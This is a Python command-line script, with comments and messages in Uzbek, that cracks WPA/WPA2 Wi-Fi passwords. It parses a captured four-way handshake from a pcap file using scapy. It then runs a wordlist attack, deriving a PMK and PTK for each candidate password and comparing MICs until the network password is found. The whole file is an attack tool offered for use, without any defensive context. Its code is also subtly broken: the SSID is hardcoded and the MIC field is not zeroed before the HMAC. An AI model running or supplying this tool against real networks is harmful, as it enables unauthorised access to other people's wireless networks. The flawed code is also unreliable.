#!/usr/bin/env python3
import sys
import os
import hmac
from scapy.all import *
from scapy.layers.eap import EAPOL
from hashlib import pbkdf2_hmac, sha1
import binascii

def check_handshake(pcap_file, target_bssid):
    """CAP fayldan handshake borligini tekshiradi"""
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"CAP faylni o'qib bo'lmadi: {e}")
        return False
        
    handshake_found = False
    
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            if pkt.addr2.lower() == target_bssid.lower():
                handshake_found = True
                break
                
    return handshake_found

def parse_handshake(pcap_file, bssid):
    """Handshake paketlaridan kerakli ma'lumotlarni ajratib oladi"""
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"CAP faylni o'qib bo'lmadi: {e}")
        return None, None, None, None, None, None
        
    ap_mac = bssid.lower()
    client_mac = ""
    anonce = ""
    snonce = ""
    mic = ""
    eapol = b""
    
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            if pkt.addr2.lower() == ap_mac:
                anonce = pkt.load[17:17+32]
                eapol = bytes(pkt)[-134:-18]
            elif pkt.addr2.lower() != ap_mac:
                client_mac = pkt.addr2.lower()
                snonce = pkt.load[17:17+32]
                mic = pkt.load[81:81+16]
    
    return ap_mac, client_mac, anonce, snonce, mic, eapol

def pmk_to_ptk(pmk, ap_mac, client_mac, anonce, snonce):
    """PMK dan PTK ni hisoblaydi"""
    pmk_data = b"Pairwise key expansion\x00" + \
               binascii.unhexlify(ap_mac.replace(':', '')) + \
               binascii.unhexlify(client_mac.replace(':', '')) + \
               anonce + snonce
    
    ptk = b""
    for i in range(4):
        ptk += hmac.new(pmk, pmk_data + bytes([i]), sha1).digest()
    
    return ptk[:64]

def crack_wifi(cap_file, wordlist_file, bssid=None):
    """Asosiy parol buzish funksiyasi"""
    if not bssid:
        print("BSSID kiritilmagan, avval tarmoqlarni skanerlab olish kerak")
        return None
    
    if not check_handshake(cap_file, bssid):
        print("CAP faylda handshake topilmadi!")
        return None
    
    ap_mac, client_mac, anonce, snonce, mic, eapol = parse_handshake(cap_file, bssid)
    if None in (ap_mac, client_mac, anonce, snonce, mic, eapol):
        print("Handshake ma'lumotlarini ajratib olishda xatolik!")
        return None
    
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            for password in f:
                password = password.strip()
                if not password:
                    continue
                
                # PMK ni hisoblash (SSID kerak, lekin bu oddiy misol)
                ssid = "TEST_NETWORK"  # SSID ni CAP fayldan parse qilish kerak
                pmk = pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)
                
                # PTK ni hisoblash
                ptk = pmk_to_ptk(pmk, ap_mac, client_mac, anonce, snonce)
                
                # MIC ni tekshirish
                calculated_mic = hmac.new(ptk[0:16], eapol, sha1).digest()[:16]
                if calculated_mic == mic:
                    print(f"\nParol topildi: {password}")
                    return password
                
                print(f"Tekshirilmoqda: {password}", end='\r')
    except Exception as e:
        print(f"\nWordlist faylni o'qishda xatolik: {e}")
        return None
    
    print("\nParol topilmadi!")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Foydalanish: python crackwifi.py <cap_file> <wordlist> [bssid]")
        sys.exit(1)
    
    cap_file = sys.argv[1]
    wordlist = sys.argv[2]
    bssid = sys.argv[3] if len(sys.argv) > 3 else None
    
    if not os.path.exists(cap_file):
        print(f"CAP fayl topilmadi: {cap_file}")
        sys.exit(1)
    
    if not os.path.exists(wordlist):
        print(f"Wordlist fayl topilmadi: {wordlist}")
        sys.exit(1)
    
    print(f"Parol buzish jarayoni boshlandi...")
    result = crack_wifi(cap_file, wordlist, bssid)
    
    if result:
        print(f"Tarmoq paroli: {result}")
    else:
        print("Parol topilmadi")